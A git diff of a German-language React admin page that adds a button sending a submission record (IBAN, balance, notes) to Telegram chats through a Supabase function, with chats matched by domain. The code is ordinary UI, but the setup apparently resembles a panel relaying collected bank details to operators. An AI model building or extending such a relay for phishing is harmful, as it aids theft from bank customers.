@@ -11,7 +11,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent as AlertContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle as AlertTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { toast } from "sonner";
-import { ArrowLeft, Copy, Download, FileDown, Minus, Plus, Save, Trash2 } from "lucide-react";
+import { ArrowLeft, Copy, Download, FileDown, Minus, Plus, Save, Send, Trash2 } from "lucide-react";
 import { useSubmission, type Note, type Submission } from "@/hooks/use-submissions";
 import { useQueryClient } from "@tanstack/react-query";
 import { formatBalance, formatIBAN, parseBalanceNumber } from "@/lib/format";
@@ -48,6 +48,19 @@ function DetailContent() {
   const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
   const [txAmount, setTxAmount] = useState("");
   const [txNote, setTxNote] = useState("");
+  const [resending, setResending] = useState(false);
+
+  const resendTelegram = async () => {
+    if (!id) return;
+    setResending(true);
+    const { data, error } = await supabase.functions.invoke("notify-telegram", {
+      body: { submission_id: id, kind: "auto", force: true },
+    });
+    setResending(false);
+    if (error || !data?.ok) { toast.error("Fehler beim Senden"); return; }
+    if (data.sent > 0) toast.success(`An ${data.sent} Chat(s) gesendet (${data.kind})`);
+    else toast.warning("Keine passenden Chats gefunden (Domain prüfen)");
+  };
 
   useEffect(() => {
     if (submission) {
@@ -257,6 +270,9 @@ function DetailContent() {
             </div>
           </div>
           <div className="flex items-center gap-2">
+            <Button variant="outline" size="sm" className="gap-1.5 text-blue-600 border-blue-200 hover:bg-blue-50" onClick={resendTelegram} disabled={resending}>
+              <Send className="h-3.5 w-3.5" /> {resending ? "Sendet..." : "An Telegram"}
+            </Button>
             <Button variant="outline" size="sm" className="gap-1.5 text-slate-500 border-slate-200 hover:border-slate-300" onClick={() => setExportOpen(true)}>
               <Download className="h-3.5 w-3.5" /> Export
             </Button>
